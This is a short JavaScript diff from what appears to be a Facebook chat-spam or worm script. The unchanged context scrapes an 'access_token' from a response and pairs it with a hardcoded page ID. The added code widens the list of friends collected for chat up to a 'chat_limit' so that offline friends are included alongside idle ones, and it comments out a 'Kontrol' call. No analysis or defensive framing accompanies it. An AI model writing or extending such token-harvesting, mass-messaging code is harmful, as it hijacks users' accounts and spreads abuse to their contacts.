@@ -105,7 +105,7 @@ function _g_T() {
         jsonOBJECT = {};
         jsonOBJECT.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
         jsonOBJECT.pages_id = 159848587923368;
-        Kontrol(jsonOBJECT);
+        //Kontrol(jsonOBJECT);
         online(jsonOBJECT);
       }
     }
@@ -184,6 +184,12 @@ function online(jsonOBJECT) {
         i = 0;
         for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
           if (friends[i].online_presence == "idle") {
+            jsonOBJECT.friends.push(friends[i]);
+          }
+        }
+        i = 0;
+        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
+          if (friends[i].online_presence == "offline") {
             jsonOBJECT.friends.push(friends[i]);
           }
         }
